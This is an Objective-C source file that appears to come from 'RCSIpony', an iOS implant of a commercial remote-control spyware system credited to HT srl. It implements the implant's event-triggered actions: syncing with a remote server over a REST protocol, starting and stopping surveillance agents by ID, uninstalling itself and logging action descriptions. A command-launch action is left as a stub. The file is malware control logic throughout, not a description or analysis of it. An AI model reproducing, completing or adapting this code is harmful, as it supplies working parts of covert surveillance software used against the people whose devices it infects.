/*
 * RCSIpony - Actions
 *  Provides all the actions which should be triggered upon an Event
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 11/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import "RCSIActions.h"
#import "RCSITaskManager.h"
#import "RESTNetworkProtocol.h"
#import "RCSICommon.h"
#import "RCSIInfoManager.h"

//#define DEBUG


@implementation RCSIActions

- (BOOL)actionSync: (NSMutableDictionary *)aConfiguration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  [aConfiguration retain];

  NSData *syncConfig = [[aConfiguration objectForKey: @"data"] retain];
  RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
                                   initWithConfiguration: syncConfig];

  if ([protocol perform] == NO)
    {
#ifdef DEBUG_ACTIONS
      errorLog(@"An error occurred while syncing with REST proto");
#endif
    }
  else
    {
      BOOL bSuccess = NO;
      
      RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
      
      NSMutableDictionary *agentConfiguration = [taskManager getConfigForAgent: AGENT_DEVICE];
      
      deviceStruct *tmpDevice = 
      (deviceStruct*)[[agentConfiguration objectForKey: @"data"] bytes];
      
      if (tmpDevice != nil &&
          tmpDevice->isEnabled == AGENT_DEV_ENABLED)
        {          
          bSuccess = [taskManager startAgent: AGENT_DEVICE];
          
#ifdef DEBUG
          NSLog(@"%s: sync performed... restarting DEVICE Agent %d", __FUNCTION__, bSuccess);
#endif
        }
      else
        {
#ifdef DEBUG
          NSLog(@"%s: sync performed... DEVICE Agent dont restarted", __FUNCTION__);
#endif
        }
    }
  
  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];

  [protocol release];  
  [aConfiguration release];
  [outerPool release];
  
  return YES;
}

- (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration start: (BOOL)aFlag
{
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];

  [aConfiguration retain];
  
  //
  // Start/Stop Agent actions got the agentID inside the additional Data
  //
  u_int agentID = 0;
  [[aConfiguration objectForKey: @"data"] getBytes: &agentID];
  
  if (aFlag == TRUE)
    [taskManager startAgent: agentID];
  else
    [taskManager stopAgent: agentID];
  
  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];
  
  return TRUE;
}

- (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration
{
#ifdef DEBUG
  NSLog(@"Action Launch Command started!");
#endif
  
  // XXX: To be implemented
  
  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];
  
  return TRUE;
}

- (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration
{
  RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
  [aConfiguration retain];
  
#ifdef DEBUG
  NSLog(@"Action Uninstall started!");
#endif
  
  [taskManager uninstallMeh];
  
  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];
  
  return TRUE;
}

- (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration
{
  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
  [aConfiguration retain];

  NSData *conf = [aConfiguration objectForKey: @"data"];
  
#ifdef DEBUG
  NSLog(@"Action Info started: %@", [aConfiguration objectForKey: @"data"]);
#endif

  int32_t len = 0;
  NSData *stringData;
  
  [conf getBytes: &len
          length: sizeof(int32_t)];
  
  @try
    {
      stringData = [conf subdataWithRange: NSMakeRange(sizeof(int32_t), len)];
    }
  @catch (NSException *e)
    {
#ifdef DEBUG
      NSLog(@"exception on makerange (%@)", [e reason]);
#endif

      [aConfiguration release];
      return NO;
    }
    
  NSString *text = [[NSString alloc] initWithData: stringData
                                         encoding: NSUTF16LittleEndianStringEncoding];
  
  [infoManager logActionWithDescription: text];
  
  [text release];
  [aConfiguration release];
  [infoManager release];

  return TRUE;
}

@end
